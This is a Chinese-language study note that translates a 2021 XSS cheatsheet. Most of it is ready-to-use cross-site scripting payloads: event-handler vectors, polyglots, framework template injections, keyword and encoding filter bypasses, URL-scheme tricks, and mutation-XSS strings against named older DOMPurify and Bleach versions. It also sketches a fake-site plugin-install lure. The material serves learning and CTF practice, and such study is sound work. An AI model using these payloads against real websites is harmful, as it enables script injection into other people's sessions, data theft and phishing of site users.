# 2023-05-13：筆記 Sam Anttila 的 Cheatsheet: XSS that works in 2021.md
## Sam Anttila,  Feb 7, 2021
- https://twitter.com/SamuelAnttila
### Ref: https://netsec.expert/posts/xss-in-2021/

----------------

Sam Anttila 是 Google 的 security engineer & security researcher  

這篇是他針對 XXS 技巧的整理，並且有註明 2021 年（另外還有一篇 2020 年的），我對這篇有點興趣。  

反正目前我就是需要大量學習，所以看看這篇。  

**注意！很多技巧有用到特殊字元，我用 markdown 很可能沒法好好顯示出一些特殊字元。要使用時，保險起見可以去上面原文連結確認。**

----------------

距離上次的 XSS cheatsheet 已過去一年
- 這裡有個更新的版本，裡面裝滿了我自己使用的好東西!

注意：本小抄只關注最新的相關項目
- 你會帶著有很多不相關內容的小抄去參加考試嗎？當然不會。
- 我討厭那些在不再有效的方法（如 CSS 注入的 XSS），或者只在老的瀏覽器上起作用的小抄
- 所以本小抄只關注那些在 2021 年有用的技術
- 如果喜歡這篇文章，在 Twitter 上關注我，以獲得更多的信息安全技巧和竅門
  - ( [https://twitter.com/SamuelAnttila](https://twitter.com/SamuelAnttila) )

----------------

## New stuff
- 更多 `HTML event` 的好處
- 更多的 `mXSS`
- 更多 JS Framework payloads (VueJS，Mavo)
- 繞過 URL Schema filter
- 擴展 XSS filter 的繞過技巧
  - (escape sequences, exploiting JS weirdness, HTML entities & more)
- 更多 JS tips and tricks
- MIME type exploitation


----------------

## Tag-attribute separators (標籤-屬性分隔符)
有時過 filters 認為只有某些符號可以分 `tag` 和它的 `attribute`
- 這裡有個在 firefox 和 chrome 中有效的 separators 的完整列表：

|Decimal value|URL Encoded|Human desc|
| :---: | :---: | :--- |
| 47 | `%2F` | Forward slash(斜線) |
| 13 | `%0D` | Carriage Return(歸位字元) |
| 12 | `%0C` | Form Feed(分頁符號) |
| 10 | `%0A` | New Line |
| 9 | `%09` | Horizontal Tab(水平制表) |

### Examples
基本上，如果有個 payload 像這樣:

```html
<svg onload=alert(1)>
```

你可以嘗試將 `svg` 和 `onload` 間的「空格」換成任何一個符號
- 這適用於所有 HTML tag
- 可以打開這 demo [valid html](https://netsec.expert/examples/valid-html.html) 測試

Forward slash (正斜線):
```html
<svg/onload=alert(1)><svg>
```

New line:
```html
<svg
onload=alert(1)><svg>
```


Tab:
```html
<svg	onload=alert(1)><svg>
```

New page `(0xC)` (`svg` 跟 `onlond` 之間有特殊符號。需要用能看特殊符號的編輯器才會標示出來):
```html
<svgonload=alert(1)><svg>
```

----------------

## JavaScript event 相關的 XSS

關於 events 和其支持的瀏覽器的 ref：
- [More HTML events](http://help.dottoro.com/ljfvvdnm.php)

### Standard HTML events
這邊列出標準 HTML events
- 只列出 `0-click only` (不需要 User 去點擊，就會自動觸發的 event)
  

| Tag Attribute | Tags supported | Note |
| :--- | :--- | :--- |
| onload | body, iframe, img, frameset, input, script, style, link, svg | 很適合 `0-click`，但通常會被過濾 |
| onpageshow | body | 很適合 `0-click`，但只適用於 Non-DOM injections |
| onfocus | input, select, a | 用在 `0-click`，與 `autofocus=""` 一起使用 |
| onerror | img, input, object, link, script, video, audio | 確保傳遞參數以使其失敗 |
| onanimationstart | 與任何可以製作動畫的 element 結合使用 | CSS animation starts 時觸發 |
| onanimationend | 與任何可以製作動畫的 element 結合使用 | CSS animation ends 時觸發|
| onstart | marquee | 在 marquee animation start 時觸發(限Firefox?) |
| onfinish | marquee | 在 marquee animation end 時觸發(限Firefox?) |
| ontoggle | details | 要 `0-click` 的話，必須要有 `open` 屬性 |



### Situational HTML events

|Tag Attribute | Tags supported | Note|
| :--- | :--- | :--- | 
|onmessage | most tags | `postMessage` 通常用於繞過 iframe 限制和傳輸 data，因此如果頁面這樣做，你可以用 `onmessage` 來攔截消息和觸發程式碼|
| onblur | input, select, a | 設上 `autofocus=""`，當 user 點頁面上的任何東西將 focus 從 injected element 上移開時，可以達成 `1-click` |



Examples:

```html
<body onload=alert()>
```

```html
<img src=x onerror=alert()>
```

```html
<svg onload=alert()>
```

```html
<body onpageshow=alert(1)>
```

```html
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
```


```html
<!-- (firefox only) -->
<marquee onstart=alert(1)>
```

```html
<!-- (firefox only) -->
<marquee loop=1 width=0 onfinish=alert(1)> 
```


```html
<input autofocus="" onfocus=alert(1)></input>
```

```html
<details open ontoggle="alert()">
```

### HTML5 events
(0-click only)  

| Name | Tags | Note |
| :--- | :--- | :--- |
| onplay | video, audio | `0-click`: 結合 HTML `autoplay` 屬性和有效的 video/audio clip |
| onplaying | video, audio | `0-click`: 結合 HTML `autoplay` 屬性和有效的 video/audio clip |
| oncanplay | video, audio | 必須連接到有效的 video/audio clip |
| onloadeddata | video, audio | 必須連接到有效的 video/audio clip |
| onloadedmetadata | video, audio | 必須連接到有效的 video/audio clip |
| onprogress | video, audio | 必須連接到有效的 video/audio clip |
| onloadstart | video, audio | 很有潛力的 underexploited `0-click` vector |
| oncanplay | video, audio | 必須連接到有效的 video/audio clip |


Examples:

```html
<video autoplay onloadstart="alert()" src=x></video>
```

```html
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
```

```html
<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
```

```html
<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
```

```html
<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
```

```html
<video controls onloadstart="alert()"><source src=x></video>
```

```html
<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
```

```html
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
```

```html
<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
```

### CSS-based
- CSS 的真正的 XSS injection 目前是死的（沒太多可以發揮的）

以下是依賴 CSS stylesheets 或通過 CSS stylesheets 加強的 XSS vectors:

| Name | Tags | Note |
| :---| :--- | :--- |
| onmouseover | most tags | 當 mouse 移到 injected element 上時將觸發。盡可能 style element，讓 element 變大，這樣更容易觸發到 |
| onclick | most tags | User 點擊 element 時觸發。盡可能 style element，讓 element 變大，這樣更容易觸發到 |
| onanimationstart & onanimationend | most tags | 在 CSS 動畫開始或結束時觸發，可以在頁面 load 時觸發 (`0-click`) |


注意：下面使用 style tag 來設置動畫的 `keyframes` (start|end)
- 但也可以通過使用例如 `animation: alreadydefined;` 來檢查已經包含的 CSS 來重用已經存在的東西
- 動畫是什麼並不重要，重要的是它的存在。


```html
<style>@keyframes x {}</style>
```


```html
<p style="animation: x;" onanimationstart="alert()">XSS</p>
```


```html
<p style="animation: x;" onanimationend="alert()">XSS</p>
```


Injects 一個看不見的覆蓋層
- 如果頁面上的任何地方被點擊，就會觸發一個 payload
 

```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
```


跟上面一樣，但只要頁面上任何地方移動 mouse 就會觸發 (`0-click-ish`):

```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

----------------

## 奇怪的 XSS vectors
只是一些奇怪的/古怪的載體，我沒有看到經常提到：


```html
<svg><animate onbegin=alert() attributeName=x></svg>
```
```html
<object data="data:text/html,<script>alert(5)</script>">
```
```html
<iframe srcdoc="<svg onload=alert(4);>">
```
```html
<object data=javascript:alert(3)>
```
```html
<iframe src=javascript:alert(2)>
```
```html
<embed src=javascript:alert(1)>
```
```html
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
```
```html
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```

----------------

## XSS Polyglots (聚能器)
我有在使用幾個 XSS polyglots
- 因為有時你只有一定數量的符號可以輸入，需要一個基於 DOM 或 non-DOM 的聚能器
- 不要 100% 依賴這些，有些情況下它們會失敗
  - 但如果你對所有的 data 進行 injection testing，那 polyglots 可以提供不錯的覆蓋率


(這邊有很多特殊符號，markdown 可能無法好好顯示。有需要的話，記得去原文確認正確的範例)  
| # chars | Usage | Polyglots |
| :--- | :--- | :--- |
| 141 | Both | ``javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"`` |
| 88 | Non-DOM | `"'--></noscript></noembed></template></title></textarea></style><script>alert()</script>` |
| 95 | DOM | `'"--></title></textarea></style></noscript></noembed></template></frameset><svg onload=alert()>` |
| 54 | Non-DOM | `"'>-->*/</noscript></ti tle><script>alert()</script>` |
| 42 | DOM | `"'--></style></script><svg oNload=alert()>` |


提示：
- 通過改變大寫字母和使用 tag-attribute separators，你可以很容易地在這些上面創造出一些變化

----------------

## Frameworks
要攻擊 JS Frameworks，一定要對相關的 templating language 進行研究

VueJS  
V3
```
{{_openBlock.constructor('alert(1)')()}}
```
Credit: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

V2
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

AngularJS
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)
That payload works in most cases, but [this page](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) has a bunch of other recommendations.


Mavo
```
[self.alert(1)]
```
```
javascript:alert(1)%252f%252f..%252fcss-images
```
```
[''=''or self.alert(1)]
```
```
[Omglol mod 1 mod self.alert (1) andlol]
```

Credit: [Gareth Heyes](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)  

----------------

## XSS Filter Bypasses
用 JS template literals 來呼叫 function

```html
<svg onload=alert`1`></svg>
<script>alert`1`</script>
```

### 濫用 HTML entities
請注意，這只對 HTML injection 起作用
- 如果值被直接注入到 script tag 中，則不會起作用
- 這是因為解碼是在 HTML parser 中進行的
- 而在 script tag 間的任何東西都會被直接發送到 javacript engine，而不會被解碼

```html
<svg onload=alert&lpar;1&rpar;></svg>
```
```html
<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>
```
```html
<svg onload=alert&#x28;1&#x29></svg>
```
```html
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```
```html
<svg onload=alert&#40;1&#41></svg>
```


HTML entities encoder 可用 [html-entities](https://mothereff.in/html-entities)
- 記得取消勾選 `only encode unsafe ...` 選項

你可以使用三套不同的 HTML entities encoding，並組合它們
- (`&plar; -> (`), hex (`&x28; -> (`) and decimal (`&#40; -> (`)


### 限制性符號集
這 3 個網站會將有效的 JS 轉化為可怕的怪物，有很大的機會繞過很多過濾器：
1. `JSFuck`: 將任意 JS 翻譯成可執行的 JS，只用 6 個符號。缺點是，複雜的 javascript payload 會變得非常長
    - http://www.jsfuck.com/
2. `JSFsck – JSFuck without parentheses`: 與上相同，但更多的限製符號集
    - https://github.com/centime/jsfsck
3. `jjencode`: 情況特殊，但也是值得了解的。
    - https://utf-8.jp/public/jjencode.html
4. `arubesh.js`: 在 JSFuck 的基礎上需要一些額外的符號，但如果空間有限，加上寬鬆的過濾，可能會很有用
    - https://aem1k.com/aurebesh.js/



### 關鍵字過濾
避免關鍵詞被過濾、特定的 substrings：
- 利用各種技巧來繞過過濾器

```js
(alert)(1)
```
```js
globalThis[`al`+/ert/.source]`1`
```
```js
this[`al`+/ert/.source]`1`
```
```js
[alert][0].call(this,1)
```
```js
window['a'+'l'+'e'+'r'+'t']()
```
```js
window['a'+'l'+'e'+'r'+'t'].call(this,1)
```
```js
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
```
```js
(1,2,3,4,5,6,7,8,alert)(1)
```
```js
x=alert,x(1)
```
```js
[1].find(alert)
```
```js
top["al"+"ert"](1)
```
```js
top[/al/.source+/ert/.source](1)
```
```js
al\u0065rt(1)
```
```js
al\u0065rt`1`
```
```js
top['al\145rt'](1)
```
```js
top['al\x65rt'](1)
```
```js
top[8680439..toString(30)](1)
```

----------------

## 一般技巧
### 構建 string

Regex 字元：
- `/part1/.source+/part2/.source` => `'part1part2'`

Numbers to strings:
- `8680439..toString(30)` => `'alert'`
- ( Number is generated using `parseInt(“alert”,30)`, other bases also work )



### String 裡面使用 character escape sequences
這方面的簡單工具可以用[js-escapes](https://mothereff.in/js-escapes):
- `"\x41" -> "A"`: 十六進制 encoding
- `"\u0065" -> "A"`: unicode encoding (值為十進制)
- `"\101" -> "A"`: 八進制 encoding


### VaRy ThE capItaliZatiOn (把字母大小寫弄亂)
有時，regex 或其他定制的 filters 會進行區分大小寫的匹配
- 這時你可以直接使用`toLowerCase()`
  - `globalThis["aLeRt".toLowerCase()]`



### 呼叫 functions

[Template literal syntax](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)
- JS 可以用 Template literals 來當作呼叫 function，並傳參數進去

```js
alert`1`
```

Function.prototype.apply
```js
alert.apply(this,[1])
```

Function.prototype.call
```js
alert.call(this,1)
```

predicates
```js
[1].find(alert)
[1].filter(alert)
```


### Reuse and recycle
記住要研究已經 load 的東西
- jQuery 是個簡單的例子，但任何足夠複雜的框架都可能有可用的東西
- [Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en) 或類似的工具可以幫助我們
  - `window.jQuery.globalEval("alert(1)")`。
  - `$.globalEval("alert(1)")`。


### mXSS(mutation XSS) and DOM Clobbering (破壞)
XSS filters 基本上不可能正確預測 HTML 被瀏覽器和交互式 library mutated 的每一種方式
- 所以有時可以把 XSS 的 payload 作為無效的 HTML 偷偷放進去
- 而瀏覽器和 sanitizer 會把它修正為有效的 payload，這就繞過了所有的 filtering



有很多細節的 mXSS 論文：
- https://cure53.de/fp170.pdf

有關於 clobbering 的一場 talk：
- https://www.youtube.com/watch?v=5W-zGBKvLxk


### 消毒器(Sanitizer)繞過 mXSS的 payload 
注意: `mXSS` 可能與瀏覽器有關，所以也要嘗試多種瀏覽器

[Bleach <=3.1.1](https://securityboulevard.com/2020/07/mutation-cross-site-scripting-mxss-vulnerabilities-discovered-in-mozilla-bleach/)

```html
<noscript><style></noscript><img src=x onerror=alert(1)>
```
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```


[DOMPurify <2.1](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
(注：我不得不對一些內容進行調整，以使其發揮作用)

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```
```html
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```
```html
<math><mtext><table><mglyph><style><!--</style><img title=&quot;--></mglyph><img	src=1	onerror=alert(1)>">
```

[DOMPurify <2.0.1](https://research.securitum.com/dompurify-bypass-using-mxss/)  

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```
```html
<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
```


### 雙重 encoding
很簡單
- 有時 app 會在一個 string 上執行 XSS filtering，然後再解碼一次，這就使它被過濾器繞過
- 這是很罕見的，但我認識的一些 bug hunters 對它發誓，所以我把它包括進來作為參考


|Char | Double encoded |
| :---: | :---: |
| `<` | `%253C` |
| `>` | `%253E` |
| `(` | `%2528` |
| `)` | `%2529` |
| `"` | `%2522` |
| `'` | `%2527` |

----------------

## 繞過 URL Schema 過濾器
比方說，你有機會將 data 注入到接觸到 URL 中
- 比如 `location.href`，但是它被過濾了
- 這是可以嘗試繞過它的事情的列表
- 歸功於 [XSS Exploitation in Django Applications](https://tonybaloney.github.io/posts/xss-exploitation-in-django.html) 這篇好文章



其中一些與瀏覽器有關。在依賴它之前，先單獨嘗試你的 payload:
| 技巧 | 舉例 | |
| 區分大小寫 | `JaVaScript:alert(1)` | URL protocol 是**不區分大小寫**|
| protocol 內插入一些空白 | `javas cript:alert(1)` | tab `(0x9)`, newline `(0xa)` and carriage return `(0xd)` 允許在 protocol 中的任何位置 |
| protocol 前面放空白 | `javascript:alert(1)` | 字符 `\x01-\x20` 可以在插入在 protocol 之前 |
| 冒號前、protocol 後的一些空白 | `javascript :` | tab `(0x9)`, newline `(0xa)` and carriage return `(0xd)` allowed anywhere after the protocol |

 
### Mime type exploitation
如果你能通過設置 URL（例如通過 `location.href` 或 `<a />` 的 `href`）或其他方式迫使 browser 載入 data
- 你就能執行 javascript
- 在 Firefox 中，這些被視為與原網頁 same domain
- 但 Chrome 中則不然

不管怎麼說，這可能會導致一些危險的結果，下面解釋一下:
- 如果你不熟悉，你可以通過將這些 payload 貼到 browser URL 中測試
- 它們都只是做了一個 `alert('XSS')`
- 如果你想謹慎點，你可以通過使用 base64 decoder 對 payload 進行驗證


```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+
```
```
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```


```
data:application/vnd.wap.xhtml+xml;base64,PHg6c2NyaXB0IHhtbG5zOng9Imh0dHA6Ly93d3cudzMub3J
```

不是 XSS，但考慮到其他的 `mime types`，可以弱化破壞。就像下面這個例子
- 在 Firefox 中使用 `application/x-xpinstall`，提示使用者安裝 plugin
  - 想像一下，如果有人用這個鏈接一個 `text/html` 來欺騙一個合法網站的外觀，然後提示 user 安裝 plugin，可能會獲取他們所有的瀏覽器資料，那會有多糟糕？

(Firefox only)
```
data:application/x-xpinstall;base64,<BASE64 ENCODED FIREFOX .XPI PLUGIN>
```

其他的想法包括 `java applets`、`steam`，或者任何能夠註冊 `custom protocol handler` 的東西。這裡有些關於利用它們的想法
- (連結找不到文章了) https://www.vdoo.com/blog/exploiting-custom-protocol-handlers-in-windows
- 我另外找了一篇類似主題的文章: https://parsiya.net/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/

----------------

## Resources
其他優秀的 Ref:
- [Fantastic collection of somewhat old XSS stuff](https://www.vulnerability-lab.com/resources/documents/531.txt)
- [Portswigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Portswigger XSS through Frameworks](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)
- [Pwnfunction’s XSS CTF for practising](https://xss.pwnfunction.com/) (highly recommended)

